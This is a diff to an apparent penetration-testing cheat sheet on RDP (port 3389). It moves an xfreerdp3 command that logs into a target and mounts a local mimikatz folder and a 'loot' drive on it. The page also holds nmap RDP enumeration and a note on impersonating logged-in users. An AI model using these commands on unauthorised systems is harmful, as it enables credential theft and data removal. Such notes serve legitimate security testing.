@@ -9,6 +9,11 @@ title = "🪟 RDP: TCP/UDP 3389"
 Also called "Terminal Services".
 
 ```bash
+# Connects to RDP and mounts mimikatz share
+mkdir loot; xfreerdp3 +multitransport /clipboard /dynamic-resolution /cert:ignore /v:<TARGET> /u:<USER> /p:'<PASSWORD>' /drive:'/usr/share/windows-resources/mimikatz/x64',share /drive:"$HOME/loot",loot
+```
+
+```bash
 # Enum via nmap
 sudo nmap -sV -sC --script 'rdp*' -p3389 <TARGET>
 
@@ -17,9 +22,6 @@ sudo cpan
 sudo cpan Encoding::BER
 git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
 ./rdp-sec-check.pl <TARGET>
-
-# Connects to RDP and mounts mimikatz share
-mkdir loot; xfreerdp3 +multitransport /clipboard /dynamic-resolution /cert:ignore /v:<TARGET> /u:<USER> /p:'<PASSWORD>' /drive:'/usr/share/windows-resources/mimikatz/x64',share /drive:"$HOME/loot",loot
 
 # Impersonate other logged-in user
 # NOTE: needs SYSTEM
